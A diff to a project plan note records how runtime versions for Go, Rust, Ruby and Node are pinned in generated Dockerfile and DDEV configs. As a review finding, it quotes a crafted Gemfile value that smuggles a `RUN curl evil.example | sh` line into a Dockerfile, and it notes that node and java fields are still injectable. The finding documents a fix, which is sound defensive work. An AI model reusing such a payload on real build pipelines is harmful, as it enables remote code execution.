@@ -1,6 +1,57 @@
 # patient-pinning-kernighan — runtime versions the spec can express but the generator ignores
 
-Status: Not started
+Status: IMPLEMENTED 2026-08-23 (unit/tsc verified, NOT live-e2e — no image was built and no DDEV
+project was booted from a generated config).
+
+What shipped, against the three shapes below:
+
+1. Go unfrozen. `DEFAULT_GO_VERSION` / `DEFAULT_RUST_VERSION` in
+   `env-replicate/_shared.ts` (there, not in 02, because 02 already imports 01 and a
+   back-import would be a cycle whose const-init order decides whether the worker boots).
+   `versions.go` overrides it. VERIFIED against go.dev/static.rust-lang.org on the day:
+   Go 1.26.7 (mature line's latest patch, not the then-five-day-old 1.27.0), Rust 1.98.0.
+2. Rust no longer floats — `--default-toolchain stable` became the recorded version. A
+   two-part Cargo.toml `rust-version` passes straight through (VERIFIED: channel-rust-1.98
+   and -1.98.0 both resolve).
+3. DDEV Node written. `renderDdevConfig` emits `nodejs_version`, gated on node being a
+   DECLARED runtime (the test `nodeInspect` already uses) and on a plain numeric version.
+
+Two findings that changed the implementation, both MEASURED rather than reasoned:
+
+- Go release filenames are NOT uniform. `go1.26.linux-amd64.tar.gz` 404s, so taking a
+  go.mod `go 1.26` verbatim would have broken every build it touched. The bare `X.Y` name
+  stops at 1.20 and `X.Y.0` starts at 1.21 (go1.20 200 / go1.20.0 404 / go1.21 404 /
+  go1.21.0 200) — `normalizeGoVersion` keys on that boundary.
+- DDEV validates `nodejs_version` for WHITESPACE ONLY (read out of the 1.25.3 binary:
+  "Node.js versions cannot contain whitespace"). A range like `^22` therefore passes DDEV
+  and fails later inside the container at nvm. `package.json` engines reach this through
+  sanitizeVersion, which strips `>=` but leaves `20 || ^22` intact, so the line is written
+  only for `^\d+(\.\d+){0,2}$` and otherwise omitted — DDEV's own default, i.e. exactly
+  today's behaviour.
+
+Ruby is the deliberate partial. `versions.ruby` is now declared, recorded and surfaced in
+the Dockerfile comment, but NOT honoured: apt ships one interpreter per suite, and naming a
+package the suite lacks fails the build. The generated comment says so in as many words
+rather than emitting a pin that means nothing. The version manager stays out of scope, as
+below.
+
+One defect this change would otherwise have INTRODUCED, caught on review and fixed here:
+`versions.rust` and `versions.ruby` default to a repo-derived capture (`rust-version = "..."`
+in Cargo.toml, `ruby '...'` in a Gemfile), and a JS negated character class matches a newline
+— so a crafted file closes the quote a line later and carries its own `RUN` into the
+generated Dockerfile. REPRODUCED pre-guard: the Gemfile regex returns
+`3.4\nRUN curl evil.example | sh`, which rendered as a standalone RUN line. `isPlainVersion`
+now gates both (Go was already safe: normalizeGoVersion rebuilds the string from numeric
+parts). NOT fixed, because it is pre-existing and outside this plan: `versions.node`
+(package.json `engines.node`) and `versions.java` (pom.xml `<maven.compiler.source>`) reach
+their install lines the same way and are injectable identically. `versions.php` is safe —
+normalizePhpVersion strips everything but digits and dots.
+
+`declaredDeps.versions` gains go/rust/ruby CONDITIONALLY, like `browser` and for the same
+reason — the object is folded into `envTemplateHash`, so three always-present nulls would
+have forked a template row and rebuilt the image of every environment on the install for no
+change. VERIFIED both directions: a project declaring none of the three hashes identically;
+a Go project that declares one does not.
 Origin: raised 2026-08-22 while answering "how do we handle runtime versions currently?"
 
 ## Context
